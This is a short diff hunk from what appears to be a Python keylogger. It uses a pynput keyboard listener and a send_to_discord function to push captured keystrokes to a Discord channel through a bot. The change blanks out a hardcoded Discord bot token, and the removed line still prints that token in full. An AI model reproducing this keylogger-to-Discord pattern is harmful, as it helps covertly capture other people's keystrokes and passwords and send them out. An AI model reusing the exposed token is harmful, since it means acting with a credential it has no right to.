@@ -148,7 +148,7 @@ with Listener(on_press=on_press) as listener:
 
 def send_to_discord(channel_id, bot_token):
     channel_id = str("")
-    bot_token = str("MTE2MTU1NjE1MDg1NzI0MDYwNg.GQXPB8.n3WcD5o-hMRL_CYlfbQgJ0H0K0nK6z99SHAo7c")
+    bot_token = str("")
     # Crea un cliente de discord
     client = discord.Client()
 
